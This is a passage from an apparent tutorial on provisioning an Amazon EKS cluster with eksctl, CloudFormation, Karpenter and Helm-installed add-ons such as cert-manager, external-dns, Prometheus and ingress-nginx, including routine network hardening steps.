\"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } CloudFlare mylabs.dev zone Create Route53 zone and KMS key Generate a CloudFormation template that defines an Amazon Route 53 zone and an AWS Key Management Service (KMS) key. Add the new domain CLUSTER_FQDN to Route 53, and set up DNS delegation from the BASE_DOMAIN. tee \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Description: Route53 entries and KMS key Parameters: BaseDomain: Description: \"Base domain where cluster domains + their subdomains will live - Ex: k8s.mylabs.dev\" Type: String ClusterFQDN: Description: \"Cluster FQDN (domain for all applications) - Ex: k01.k8s.mylabs.dev\" Type: String ClusterName: Description: \"Cluster Name - Ex: k01\" Type: String Resources: HostedZone: Type: AWS::Route53::HostedZone Properties: Name: !Ref ClusterFQDN RecordSet: Type: AWS::Route53::RecordSet Properties: HostedZoneName: !Sub \"${BaseDomain}.\" Name: !Ref ClusterFQDN Type: NS TTL: 60 ResourceRecords: !GetAtt HostedZone.NameServers KMSAlias: Type: AWS::KMS::Alias Properties: AliasName: !Sub \"alias/eks-${ClusterName}\" TargetKeyId: !Ref KMSKey KMSKey: Type: AWS::KMS::Key Properties: Description: !Sub \"KMS key for ${ClusterName} Amazon EKS\" EnableKeyRotation: true PendingWindowInDays: 7 KeyPolicy: Version: \"2012-10-17\" Id: !Sub \"eks-key-policy-${ClusterName}\" Statement: - Sid: Enable IAM User Permissions Effect: Allow Principal: AWS: - !Sub \"arn:aws:iam::${AWS::AccountId}:root\" Action: kms:* Resource: \"*\" - Sid: Allow use of the key Effect: Allow Principal: AWS: - !Sub \"arn:aws:iam::${AWS::AccountId}:role/aws-service-role/autoscaling.amazonaws.com/AWSServiceRoleForAutoScaling\" # The following roles needs to be enabled after the EKS cluster is created # aws-ebs-csi-driver + Karpenter should be able to use the KMS key # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-irsa-aws-ebs-csi-driver\" # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-iamservice-role\" Action: - kms:Encrypt - kms:Decrypt - kms:ReEncrypt* - kms:GenerateDataKey* - kms:DescribeKey Resource: \"*\" - Sid: Allow attachment of persistent resources Effect: Allow Principal: AWS: - !Sub \"arn:aws:iam::${AWS::AccountId}:role/aws-service-role/autoscaling.amazonaws.com/AWSServiceRoleForAutoScaling\" # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-irsa-aws-ebs-csi-driver\" # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-iamservice-role\" Action: - kms:CreateGrant Resource: \"*\" Condition: Bool: kms:GrantIsForAWSResource: true Outputs: KMSKeyArn: Description: The ARN of the created KMS Key to encrypt EKS related services Value: !GetAtt KMSKey.Arn Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyArn\" KMSKeyId: Description: The ID of the created KMS Key to encrypt EKS related services Value: !Ref KMSKey Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyId\" EOF if [[ $(aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE --query \"StackSummaries[?starts_with(StackName, \\`${CLUSTER_NAME}-route53-kms\\`) == \\`true\\`].StackName\" --output text) == \"\" ]]; then # shellcheck disable=SC2001 eval aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides \"BaseDomain=${BASE_DOMAIN} ClusterFQDN=${CLUSTER_FQDN} ClusterName=${CLUSTER_NAME}\" \\ --stack-name \"${CLUSTER_NAME}-route53-kms\" --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" --tags \"${TAGS//,/ }\" fi # shellcheck disable=SC2016 AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${CLUSTER_NAME}-route53-kms\" --query 'Stacks[0].Outputs[? OutputKey==`KMSKeyArn` || OutputKey==`KMSKeyId`].{OutputKey:OutputKey,OutputValue:OutputValue}') AWS_KMS_KEY_ARN=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyArn\\\") .OutputValue\") AWS_KMS_KEY_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyId\\\") .OutputValue\") After running the CloudFormation stack, you should see the following Route53 zones: Route53 k01.k8s.mylabs.dev zone Route53 k8s.mylabs.dev zone You should also see the following KMS key: KMS key Create Amazon EKS I will use eksctl to create the Amazon EKS cluster. tee \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" &lt;&lt; EOF apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: ${CLUSTER_NAME} region: ${AWS_DEFAULT_REGION} tags: karpenter.sh/discovery: ${CLUSTER_NAME} $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") availabilityZones: - ${AWS_DEFAULT_REGION}a - ${AWS_DEFAULT_REGION}b iam: withOIDC: true serviceAccounts: - metadata: name: aws-for-fluent-bit namespace: aws-for-fluent-bit attachPolicyARNs: - arn:aws:iam::aws:policy/CloudWatchAgentServerPolicy roleName: eksctl-${CLUSTER_NAME}-irsa-aws-for-fluent-bit - metadata: name: ebs-csi-controller-sa namespace: aws-ebs-csi-driver wellKnownPolicies: ebsCSIController: true roleName: eksctl-${CLUSTER_NAME}-irsa-aws-ebs-csi-driver - metadata: name: cert-manager namespace: cert-manager wellKnownPolicies: certManager: true roleName: eksctl-${CLUSTER_NAME}-irsa-cert-manager - metadata: name: external-dns namespace: external-dns wellKnownPolicies: externalDNS: true roleName: eksctl-${CLUSTER_NAME}-irsa-external-dns # Allow users which are consuming the AWS_ROLE_TO_ASSUME to access the EKS iamIdentityMappings: - arn: arn:aws:iam::${AWS_ACCOUNT_ID}:role/admin groups: - system:masters username: admin karpenter: # renovate: datasource=github-tags depName=aws/karpenter extractVersion=^(?&lt;version&gt;.*)$ version: v0.31.4 createServiceAccount: true withSpotInterruptionQueue: true addons: - name: vpc-cni version: latest configurationValues: |- enableNetworkPolicy: \"true\" env: ENABLE_PREFIX_DELEGATION: \"true\" - name: kube-proxy - name: coredns managedNodeGroups: - name: mng01-ng amiFamily: Bottlerocket # Minimal instance type for running add-ons + karpenter - ARM t4g.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly # Minimal instance type for running add-ons + karpenter - X86 t3a.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly instanceType: t4g.medium # Due to karpenter we need 2 instances desiredCapacity: 2 availabilityZones: - ${AWS_DEFAULT_REGION}a minSize: 2 maxSize: 5 volumeSize: 20 disablePodIMDS: true volumeEncrypted: true volumeKmsKeyID: ${AWS_KMS_KEY_ID} maxPodsPerNode: 110 privateNetworking: true bottlerocket: settings: kubernetes: seccomp-default: true secretsEncryption: keyARN: ${AWS_KMS_KEY_ARN} cloudWatch: clusterLogging: logRetentionInDays: 1 enableTypes: - all EOF Get the kubeconfig file to access the cluster: if [[ ! -s \"${KUBECONFIG}\" ]]; then if ! eksctl get clusters --name=\"${CLUSTER_NAME}\" &amp;&gt; /dev/null; then eksctl create cluster --config-file \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" --kubeconfig \"${KUBECONFIG}\" # Add roles created by eksctl to the KMS policy to allow aws-ebs-csi-driver work with encrypted EBS volumes sed -i \"s@# \\(- \\!Sub \\\"arn:aws:iam::\\${AWS::AccountId}:role/eksctl-\\${ClusterName}.*\\)@\\1@\" \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" eval aws cloudformation update-stack \\ --parameters \"ParameterKey=BaseDomain,ParameterValue=${BASE_DOMAIN} ParameterKey=ClusterFQDN,ParameterValue=${CLUSTER_FQDN} ParameterKey=ClusterName,ParameterValue=${CLUSTER_NAME}\" \\ --stack-name \"${CLUSTER_NAME}-route53-kms\" --template-body \"file://${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" else eksctl utils write-kubeconfig --cluster=\"${CLUSTER_NAME}\" --kubeconfig \"${KUBECONFIG}\" fi fi aws eks update-kubeconfig --name=\"${CLUSTER_NAME}\" The sed command used earlier modified the aws-cf-route53-kms.yml file by incorporating the newly established IAM roles (eksctl-k01-irsa-aws-ebs-csi-driver and eksctl-k01-iamservice-role), enabling them to utilize the KMS key. KMS key with new IAM roles AWS_VPC_ID=$(aws ec2 describe-vpcs --filters \"Name=tag:alpha.eksctl.io/cluster-name,Values=${CLUSTER_NAME}\" --query 'Vpcs[*].VpcId' --output text) AWS_SECURITY_GROUP_ID=$(aws ec2 describe-security-groups --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" \"Name=group-name,Values=default\" --query 'SecurityGroups[*].GroupId' --output text) AWS_NACL_ID=$(aws ec2 describe-network-acls --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" --query 'NetworkAcls[*].NetworkAclId' --output text) Enhance the security posture of the EKS cluster by addressing the following concerns: The default security group should have no rules configured: aws ec2 revoke-security-group-egress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --cidr 0.0.0.0/0 | jq || true aws ec2 revoke-security-group-ingress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --source-group \"${AWS_SECURITY_GROUP_ID}\" | jq || true The VPC NACL allows unrestricted SSH access, and the VPC NACL allows unrestricted RDP access: aws ec2 create-network-acl-entry --network-acl-id \"${AWS_NACL_ID}\" --ingress --rule-number 1 --protocol tcp --port-range \"From=22,To=22\" --cidr-block 0.0.0.0/0 --rule-action Deny aws ec2 create-network-acl-entry --network-acl-id \"${AWS_NACL_ID}\" --ingress --rule-number 2 --protocol tcp --port-range \"From=3389,To=3389\" --cidr-block 0.0.0.0/0 --rule-action Deny The namespace does not have a PSS level assigned: kubectl label namespace default pod-security.kubernetes.io/enforce=baseline Karpenter Karpenter is a Kubernetes node autoscaler built for flexibility, performance, and simplicity. Configure Karpenter by applying the following provisioner definition: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-karpenter-provisioner.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: karpenter.sh/v1alpha5 kind: Provisioner metadata: name: default spec: consolidation: enabled: true requirements: - key: karpenter.sh/capacity-type operator: In values: [\"spot\", \"on-demand\"] - key: kubernetes.io/arch operator: In values: [\"amd64\", \"arm64\"] - key: \"topology.kubernetes.io/zone\" operator: In values: [\"${AWS_DEFAULT_REGION}a\"] - key: karpenter.k8s.aws/instance-family operator: In values: [\"t3a\", \"t4g\"] kubeletConfiguration: maxPods: 110 # Resource limits constrain the total size of the cluster. # Limits prevent Karpenter from creating new instances once the limit is exceeded. limits: resources: cpu: 8 memory: 32Gi providerRef: name: default # Labels are arbitrary key-values that are applied to all nodes labels: managedBy: karpenter provisioner: default --- apiVersion: karpenter.k8s.aws/v1alpha1 kind: AWSNodeTemplate metadata: name: default spec: amiFamily: Bottlerocket subnetSelector: karpenter.sh/discovery: ${CLUSTER_NAME} securityGroupSelector: karpenter.sh/discovery: ${CLUSTER_NAME} blockDeviceMappings: - deviceName: /dev/xvda ebs: volumeSize: 2Gi volumeType: gp3 encrypted: true kmsKeyID: ${AWS_KMS_KEY_ARN} - deviceName: /dev/xvdb ebs: volumeSize: 20Gi volumeType: gp3 encrypted: true kmsKeyID: ${AWS_KMS_KEY_ARN} tags: KarpenerProvisionerName: \"default\" Name: \"${CLUSTER_NAME}-karpenter\" $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") EOF aws-node-termination-handler The AWS Node Termination Handler gracefully handles EC2 instance shutdowns within Kubernetes. It is not needed when using EKS managed node groups, as discussed in Use with managed node groups. snapshot-controller Install the Volume Snapshot Custom Resource Definitions (CRDs): kubectl apply --kustomize 'https://github.com/kubernetes-csi/external-snapshotter//client/config/crd/?ref=v8.1.0' Install the volume snapshot controller snapshot-controller Helm chart and modify its default values: # renovate: datasource=helm depName=snapshot-controller registryUrl=https://piraeus.io/helm-charts/ SNAPSHOT_CONTROLLER_HELM_CHART_VERSION=\"2.2.0\" helm repo add --force-update piraeus-charts https://piraeus.io/helm-charts/ helm upgrade --wait --install --version \"${SNAPSHOT_CONTROLLER_HELM_CHART_VERSION}\" --namespace snapshot-controller --create-namespace snapshot-controller piraeus-charts/snapshot-controller kubectl label namespace snapshot-controller pod-security.kubernetes.io/enforce=baseline aws-ebs-csi-driver The Amazon Elastic Block Store (Amazon EBS) Container Storage Interface (CSI) Driver provides a CSI interface used by Container Orchestrators to manage the lifecycle of Amazon EBS volumes. (The ebs-csi-controller-sa ServiceAccount was created by eksctl) Install the Amazon EBS CSI Driver aws-ebs-csi-driver Helm chart and modify its default values: # renovate: datasource=helm depName=aws-ebs-csi-driver registryUrl=https://kubernetes-sigs.github.io/aws-ebs-csi-driver AWS_EBS_CSI_DRIVER_HELM_CHART_VERSION=\"2.28.1\" helm repo add --force-update aws-ebs-csi-driver https://kubernetes-sigs.github.io/aws-ebs-csi-driver tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-ebs-csi-driver.yml\" &lt;&lt; EOF controller: enableMetrics: false serviceMonitor: forceEnable: true k8sTagClusterId: ${CLUSTER_NAME} extraVolumeTags: \"eks:cluster-name\": ${CLUSTER_NAME} $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") serviceAccount: create: false name: ebs-csi-controller-sa region: ${AWS_DEFAULT_REGION} node: securityContext: # The node pod must be run as root to bind to the registration/driver sockets runAsNonRoot: false storageClasses: - name: gp3 annotations: storageclass.kubernetes.io/is-default-class: \"true\" parameters: encrypted: \"true\" kmskeyid: ${AWS_KMS_KEY_ARN} volumeSnapshotClasses: - name: ebs-vsc annotations: snapshot.storage.kubernetes.io/is-default-class: \"true\" deletionPolicy: Delete EOF helm upgrade --install --version \"${AWS_EBS_CSI_DRIVER_HELM_CHART_VERSION}\" --namespace aws-ebs-csi-driver --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-ebs-csi-driver.yml\" aws-ebs-csi-driver aws-ebs-csi-driver/aws-ebs-csi-driver Delete the gp2 StorageClass, as gp3 will be used instead: kubectl delete storageclass gp2 || true mailpit Mailpit will be used to receive email alerts from the Prometheus. Install mailpit helm chart and modify the default values: # renovate: datasource=helm depName=mailpit registryUrl=https://jouve.github.io/charts/ MAILPIT_HELM_CHART_VERSION=\"0.14.0\" helm repo add --force-update jouve https://jouve.github.io/charts/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailpit.yml\" &lt;&lt; EOF ingress: enabled: true annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/sj26/mailcatcher/main/assets/images/logo_large.png forecastle.stakater.com/appName: Mailpit nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri ingressClassName: nginx hostname: mailpit.${CLUSTER_FQDN} EOF helm upgrade --install --version \"${MAILPIT_HELM_CHART_VERSION}\" --namespace mailpit --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailpit.yml\" mailpit jouve/mailpit kubectl label namespace mailpit pod-security.kubernetes.io/enforce=baseline kube-prometheus-stack Prometheus should be one of the initial applications installed on the Kubernetes cluster because numerous Kubernetes services and applications can export metrics to it. The kube-prometheus-stack is a collection of Kubernetes manifests, Grafana dashboards, and Prometheus rules. It’s combined with documentation and scripts to provide easy-to-operate, end-to-end Kubernetes cluster monitoring with Prometheus using the Prometheus Operator. Install the kube-prometheus-stack Helm chart and modify its default values: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"56.6.2\" helm repo add --force-update prometheus-community https://prometheus-community.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" &lt;&lt; EOF defaultRules: rules: etcd: false kubernetesSystem: false kubeScheduler: false alertmanager: config: global: smtp_smarthost: \"mailpit-smtp.mailpit.svc.cluster.local:25\" smtp_from: \"alertmanager@${CLUSTER_FQDN}\" route: group_by: [\"alertname\", \"job\"] receiver: email routes: - receiver: 'null' matchers: - alertname =~ \"InfoInhibitor|Watchdog\" - receiver: email matchers: - severity =~ \"warning|critical\" receivers: - name: email email_configs: - to: \"notification@${CLUSTER_FQDN}\" require_tls: false ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/alert-manager.png forecastle.stakater.com/appName: Alert Manager nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hosts: - alertmanager.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - alertmanager.${CLUSTER_FQDN} # https://github.com/grafana/helm-charts/blob/main/charts/grafana/values.yaml grafana: defaultDashboardsEnabled: false serviceMonitor: enabled: true ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/grafana.png forecastle.stakater.com/appName: Grafana nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/configuration-snippet: | auth_request_set \\$email \\$upstream_http_x_auth_request_email; proxy_set_header X-Email \\$email; hosts: - grafana.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - grafana.${CLUSTER_FQDN} datasources: datasource.yaml: apiVersion: 1 datasources: - name: Prometheus type: prometheus url: http://kube-prometheus-stack-prometheus.kube-prometheus-stack:9090/ access: proxy isDefault: true dashboardProviders: dashboardproviders.yaml: apiVersion: 1 providers: - name: \"default\" orgId: 1 folder: \"\" type: file disableDeletion: false editable: true options: path: /var/lib/grafana/dashboards/default dashboards: default: 1860-node-exporter-full: # renovate: depName=\"Node Exporter Full\" gnetId: 1860 revision: 36 datasource: Prometheus 3662-prometheus-2-0-overview: # renovate: depName=\"Prometheus 2.0 Overview\" gnetId: 3662 revision: 2 datasource: Prometheus 9852-stians-disk-graphs: # renovate: depName=\"node-exporter disk graphs\" gnetId: 9852 revision: 1 datasource: Prometheus 12006-kubernetes-apiserver: # renovate: depName=\"Kubernetes apiserver\" gnetId: 12006 revision: 1 datasource: Prometheus 9614-nginx-ingress-controller: # renovate: depName=\"NGINX Ingress controller\" gnetId: 9614 revision: 1 datasource: Prometheus 11875-kubernetes-ingress-nginx-eks: # renovate: depName=\"Kubernetes Ingress Nginx - EKS\" gnetId: 11875 revision: 1 datasource: Prometheus 15038-external-dns: # renovate: depName=\"External-dns\" gnetId: 15038 revision: 3 datasource: Prometheus 14314-kubernetes-nginx-ingress-controller-nextgen-devops-nirvana: # renovate: depName=\"Kubernetes Nginx Ingress Prometheus NextGen\" gnetId: 14314 revision: 2 datasource: Prometheus 13473-portefaix-kubernetes-cluster-overview: # renovate: depName=\"Portefaix / Kubernetes cluster Overview\" gnetId: 13473 revision: 2 datasource: Prometheus # https://grafana.com/orgs/imrtfm/dashboards - https://github.com/dotdc/grafana-dashboards-kubernetes 15760-kubernetes-views-pods: # renovate: depName=\"Kubernetes / Views / Pods\" gnetId: 15760 revision: 26 datasource: Prometheus 15757-kubernetes-views-global: # renovate: depName=\"Kubernetes / Views / Global\" gnetId: 15757 revision: 37 datasource: Prometheus 15758-kubernetes-views-namespaces: # renovate: depName=\"Kubernetes / Views / Namespaces\" gnetId: 15758 revision: 34 datasource: Prometheus 15759-kubernetes-views-nodes: # renovate: depName=\"Kubernetes / Views / Nodes\" gnetId: 15759 revision: 29 datasource: Prometheus 15761-kubernetes-system-api-server: # renovate: depName=\"Kubernetes / System / API Server\" gnetId: 15761 revision: 16 datasource: Prometheus 15762-kubernetes-system-coredns: # renovate: depName=\"Kubernetes / System / CoreDNS\" gnetId: 15762 revision: 17 datasource: Prometheus 19105-prometheus: # renovate: depName=\"Prometheus\" gnetId: 19105 revision: 3 datasource: Prometheus 16237-cluster-capacity: # renovate: depName=\"Cluster Capacity (Karpenter)\" gnetId: 16237 revision: 1 datasource: Prometheus 16236-pod-statistic: # renovate: depName=\"Pod Statistic (Karpenter)\" gnetId: 16236 revision: 1 datasource: Prometheus 19268-prometheus: # renovate: depName=\"Prometheus All Metrics\" gnetId: 19268 revision: 1 datasource: Prometheus 18855-fluent-bit: # renovate: depName=\"Fluent Bit\" gnetId: 18855 revision: 1 datasource: Prometheus grafana.ini: analytics: check_for_updates: false server: root_url: https://grafana.${CLUSTER_FQDN} # Use oauth2-proxy instead of default Grafana Oauth auth.basic: enabled: false auth.proxy: enabled: true header_name: X-Email header_property: email users: auto_assign_org_role: Admin smtp: enabled: true host: \"mailpit-smtp.mailpit.svc.cluster.local:25\" from_address: grafana@${CLUSTER_FQDN} networkPolicy: enabled: true kubeControllerManager: enabled: false kubeEtcd: enabled: false kubeScheduler: enabled: false kubeProxy: enabled: false kube-state-metrics: networkPolicy: enabled: true selfMonitor: enabled: true prometheus-node-exporter: networkPolicy: enabled: true prometheusOperator: networkPolicy: enabled: true prometheus: networkPolicy: enabled: false ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/cncf/artwork/master/projects/prometheus/icon/color/prometheus-icon-color.svg forecastle.stakater.com/appName: Prometheus nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri paths: [\"/\"] pathType: ImplementationSpecific hosts: - prometheus.${CLUSTER_FQDN} tls: - hosts: - prometheus.${CLUSTER_FQDN} prometheusSpec: externalLabels: cluster: ${CLUSTER_FQDN} externalUrl: https://prometheus.${CLUSTER_FQDN} ruleSelectorNilUsesHelmValues: false serviceMonitorSelectorNilUsesHelmValues: false podMonitorSelectorNilUsesHelmValues: false retentionSize: 1GB walCompression: true storageSpec: volumeClaimTemplate: spec: storageClassName: gp3 accessModes: [\"ReadWriteOnce\"] resources: requests: storage: 2Gi EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack karpenter Karpenter automatically launches appropriately sized compute resources to handle your cluster’s applications. Customize the Karpenter default installation by upgrading its Helm chart and modifying the default values: # renovate: datasource=github-tags depName=aws/karpenter extractVersion=^(?&lt;version&gt;.*)$ KARPENTER_HELM_CHART_VERSION=\"v0.31.4\" tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" &lt;&lt; EOF replicas: 1 serviceMonitor: enabled: true settings: aws: enablePodENI: true reservedENIs: \"1\" EOF helm upgrade --install --version \"${KARPENTER_HELM_CHART_VERSION}\" --namespace karpenter --reuse-values --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" karpenter oci://public.ecr.aws/karpenter/karpenter kubectl label namespace karpenter pod-security.kubernetes.io/enforce=baseline aws-for-fluent-bit Fluent Bit is an open-source log processor and forwarder that allows you to collect data, like metrics and logs, from different sources, enrich it with filters, and send it to multiple destinations. Install the aws-for-fluent-bit Helm chart and modify its default values: # renovate: datasource=helm depName=aws-for-fluent-bit registryUrl=https://aws.github.io/eks-charts AWS_FOR_FLUENT_BIT_HELM_CHART_VERSION=\"0.1.32\" helm repo add --force-update eks https://aws.github.io/eks-charts/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-for-fluent-bit.yml\" &lt;&lt; EOF cloudWatchLogs: region: ${AWS_DEFAULT_REGION} logGroupTemplate: \"/aws/eks/${CLUSTER_NAME}/cluster\" logStreamTemplate: \"\\$kubernetes['namespace_name'].\\$kubernetes['pod_name']\" serviceAccount: create: false name: aws-for-fluent-bit serviceMonitor: enabled: true extraEndpoints: - port: metrics path: /metrics interval: 30s scrapeTimeout: 10s scheme: http EOF helm upgrade --install --version \"${AWS_FOR_FLUENT_BIT_HELM_CHART_VERSION}\" --namespace aws-for-fluent-bit --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-for-fluent-bit.yml\" aws-for-fluent-bit eks/aws-for-fluent-bit cert-manager cert-manager adds certificates and certificate issuers as resource types in Kubernetes clusters and simplifies the process of obtaining, renewing, and using those certificates. The cert-manager ServiceAccount was created by eksctl. Install the cert-manager Helm chart and modify its default values: # renovate: datasource=helm depName=cert-manager registryUrl=https://charts.jetstack.io CERT_MANAGER_HELM_CHART_VERSION=\"1.14.4\" helm repo add --force-update jetstack https://charts.jetstack.io tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" &lt;&lt; EOF installCRDs: true serviceAccount: create: false name: cert-manager extraArgs: - --cluster-resource-namespace=cert-manager - --enable-certificate-owner-ref=true securityContext: fsGroup: 1001 prometheus: servicemonitor: enabled: true webhook: networkPolicy: enabled: true EOF helm upgrade --install --version \"${CERT_MANAGER_HELM_CHART_VERSION}\" --namespace cert-manager --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" cert-manager jetstack/cert-manager kubectl label namespace cert-manager pod-security.kubernetes.io/enforce=baseline Add ClusterIssuers for the Let’s Encrypt staging environment: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-clusterissuer-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-staging-dns namespace: cert-manager labels: letsencrypt: staging spec: acme: server: https://acme-staging-v02.api.letsencrypt.org/directory email: ${MY_EMAIL} privateKeySecretRef: name: letsencrypt-staging-dns solvers: - selector: dnsZones: - ${CLUSTER_FQDN} dns01: route53: region: ${AWS_DEFAULT_REGION} EOF kubectl wait --namespace cert-manager --timeout=15m --for=condition=Ready clusterissuer --all Create the certificate: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-certificate-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: ingress-cert-staging namespace: cert-manager labels: letsencrypt: staging spec: secretName: ingress-cert-staging secretTemplate: labels: letsencrypt: staging issuerRef: name: letsencrypt-staging-dns kind: ClusterIssuer commonName: \"*.${CLUSTER_FQDN}\" dnsNames: - \"*.${CLUSTER_FQDN}\" - \"${CLUSTER_FQDN}\" EOF external-dns ExternalDNS synchronizes exposed Kubernetes Services and Ingresses with DNS providers. ExternalDNS will manage the DNS records. The external-dns ServiceAccount was created by eksctl. Install the external-dns Helm chart and modify its default values: # renovate: datasource=helm depName=external-dns registryUrl=https://kubernetes-sigs.github.io/external-dns/ EXTERNAL_DNS_HELM_CHART_VERSION=\"1.14.3\" helm repo add --force-update external-dns https://kubernetes-sigs.github.io/external-dns/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" &lt;&lt; EOF domainFilters: - ${CLUSTER_FQDN} interval: 20s policy: sync serviceAccount: create: false name: external-dns serviceMonitor: enabled: true EOF helm upgrade --install --version \"${EXTERNAL_DNS_HELM_CHART_VERSION}\" --namespace external-dns --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" external-dns external-dns/external-dns kubectl label namespace external-dns pod-security.kubernetes.io/enforce=baseline ingress-nginx ingress-nginx is an Ingress controller for Kubernetes that uses nginx as a reverse proxy and load balancer. Install the ingress-nginx Helm chart and modify its default values: # renovate: datasource=helm depName=ingress-nginx registryUrl=https://kubernetes.github.io/ingress-nginx INGRESS_NGINX_HELM_CHART_VERSION=\"4.10.0\" kubectl wait --namespace cert-manager --for=condition=Ready --timeout=10m certificate ingress-cert-staging helm repo add --force-update ingress-nginx https://kubernetes.github.io/ingress-nginx tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" &lt;&lt; EOF controller: allowSnippetAnnotations: true ingressClassResource: default: true admissionWebhooks: networkPolicyEnabled: true extraArgs: default-ssl-certificate: \"cert-manager/ingress-cert-staging\" service: annotations: service.beta.kubernetes.io/aws-load-balancer-type: nlb service.beta.kubernetes.io/aws-load-balancer-additional-resource-tags: ${TAGS//\\'/} metrics: enabled: true serviceMonitor: enabled: true prometheusRule: enabled: true rules: - alert: NGINXConfigFailed expr: count(nginx_ingress_controller_config_last_reload_successful == 0) &gt; 0 for: 1s labels: severity: critical annotations: description: bad ingress config - nginx config test failed summary: uninstall the latest ingress changes to allow config reloads to resume - alert: NGINXCertificateExpiry expr: (avg(nginx_ingress_controller_ssl_expire_time_seconds) by (host) - time()) &lt; 604800 for: 1s labels: severity: critical annotations: description: ssl certificate(s) will expire in less then a week summary: renew expiring certificates to avoid downtime - alert: 